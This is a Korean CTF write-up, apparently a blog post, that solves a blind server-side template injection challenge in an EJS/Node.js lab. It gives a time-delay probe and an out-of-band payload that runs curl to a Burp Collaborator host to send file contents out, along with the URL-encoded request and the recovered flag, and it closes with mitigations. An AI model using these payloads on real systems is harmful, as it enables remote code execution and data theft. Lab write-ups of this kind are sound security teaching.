+++
title = "VulnABLE CTF [LUXORA]: SSTI 🥇 Gold (Blind & OOB)"
description = "LUXORA 플랫폼의 Blind SSTI 환경에서 Out-of-Band(OOB) 통신을 이용해 서버 데이터를 탈취하는 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSTI", "Gold", "Blind", "OOB"]
+++

# VulnABLE CTF [LUXORA]: SSTI 🥇 Gold

Silver 난이도까지는 템플릿의 렌더링 결과(또는 에러 스택)가 어떻게든 화면에 반환되었습니다. 하지만 **Gold 난이도**(`/ssti/gold`)에서는 개발자가 모든 에러를 숨기고, 템플릿 렌더링 결과조차 데이터베이스에 저장만 할 뿐 화면에는 "Profile updated"라는 고정된 메시지만 보여줍니다.

이처럼 입력의 결과가 화면에 전혀 노출되지 않는 **Blind SSTI** 상황에서, 서버를 해킹하고 플래그를 빼내는 방법을 알아보겠습니다.

---

## 🕒 1. 타겟 탐색 및 반응 분석 (Reconnaissance)

`/ssti/gold` 는 사용자의 프로필(상태 메시지)을 업데이트하는 폼입니다.
* `POST /ssti/gold` (data: `status=Happy`) 
  ➔ 응답: `Profile updated successfully.`
* `POST /ssti/gold` (data: `status=<%= 7*7 %>`) 
  ➔ 응답: `Profile updated successfully.`

**[해커의 사고 과정]**
* 화면에 아무것도 안 나오니, 내가 넣은 템플릿 코드가 실행됐는지조차 알 수 없다.
* Command Injection 때처럼 **시간 지연(Time Delay)**이나 **외부 통신(Out-of-Band, OOB)**을 유발해서 코드가 실행되었음을 증명해야 한다!

---

## 🕒 2. 취약점 식별 (Exploitation)

### 💡 Time-based 확인
EJS 환경에서 Node.js의 프로세스를 강제로 재워버리는(Sleep) 함수를 호출해봅니다. Node.js에는 `sleep`이 내장되어 있지 않으므로, CPU를 점유하는 빈 반복문(While)을 돌리거나 `Atomics.wait` 같은 꼼수를 씁니다.

```javascript
// 약 5초간 대기하게 만드는 페이로드 (동기식)
<% const t = Date.now(); while(Date.now() - t < 5000); %>
```

이 코드를 주입하고 전송했더니, 정확히 5초 뒤에 `Profile updated successfully.` 응답이 떨어졌습니다!
Blind SSTI 취약점이 존재함이 증명되었습니다.

### 🚀 OOB (Out-of-Band) 데이터 추출 설계
이제 서버 내부의 데이터를 읽어서, 해커의 외부 서버(Burp Collaborator 등)로 보내게 만들어야 합니다. Node.js의 내장 `http` 모듈이나 `child_process`를 이용해 `curl` 명령어를 실행시킵니다.

**[OOB 로직 설계]**
1. 파일 읽기: `fs.readFileSync('flag_ssti_gold.txt').toString()`
2. 데이터 전송: 읽은 데이터를 HTTP GET 요청의 쿼리 스트링으로 실어서 해커 서버로 전송.

```javascript
<% 
  const fs = global.process.mainModule.require('fs');
  const flag = fs.readFileSync('flag_ssti_gold.txt').toString().trim();
  global.process.mainModule.require('child_process').execSync('curl http://abc123xyz.burpcollaborator.net/?data=' + flag); 
%>
```

*(참고: Base64 인코딩을 한 번 씌우면 특수문자 전송 시 발생하는 에러를 막을 수 있습니다.)*

---

## 🕒 3. 공격 수행 및 통신 확인

위 페이로드를 한 줄로 압축하고 URL 인코딩하여 전송합니다.

```http
POST /ssti/gold HTTP/1.1
Content-Type: application/x-www-form-urlencoded

status=<%25%20global.process.mainModule.require('child_process').execSync('curl%20http://abc123xyz.burpcollaborator.net/?data='+(global.process.mainModule.require('fs').readFileSync('flag_ssti_gold.txt').toString('base64')))%20%25>
```

### 🔍 공격 결과
서버는 화면에는 여전히 `Profile updated successfully.` 라고 평온하게 응답합니다.
하지만 해커의 OOB 리스너 서버의 로그를 보면 다음과 같은 HTTP 요청이 들어와 있습니다!

```text
[HTTP Request Received]
GET /?data=RkxBR3tTU1RJXw==... (Base64 인코딩된 플래그)
Source IP: 10.10.10.10
User-Agent: curl/7.68.0
```

Base64 문자열을 디코딩합니다:
`FLAG{SSTI_🥇_BLIND_OOB_X4Y5Z6}`

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SSTI_🥇_BLIND_OOB_X4Y5Z6}`

### 📝 왜 이런 공격이 성공했는가?
Blind 환경이라고 해서 코드가 안 도는 것이 아닙니다. 템플릿 엔진은 서버 내부에서 백그라운드 프로세스로 렌더링을 수행하며, 이때 네트워크 통신이나 파일 시스템 접근 권한이 막혀있지 않으면 해커는 서버를 마음대로 조종하는 **좀비 PC**처럼 활용할 수 있습니다.

### 🛡️ 방어 대책 (Mitigation)
1. **아웃바운드(Egress) 방화벽 제한**: 서버가 렌더링 작업을 수행하는 망에서는 외부 인터넷으로 나가는 트래픽(HTTP, DNS 등)을 원천 차단하여 OOB 데이터 유출 통로를 끊어야 합니다.
2. **최소 권한의 원칙**: Node.js 프로세스를 구동하는 유저(`www-data` 등)가 `/etc/passwd`나 시스템 명령어(`curl`, `bash`)를 실행할 수 없도록 권한을 철저히 제한(Chroot, Docker 컨테이너 캡슐화)해야 합니다.

다음은 사용자 계정을 무차별적으로 뚫어버리는 **Brute Force (인증 우회)** 카테고리로 넘어가 보겠습니다!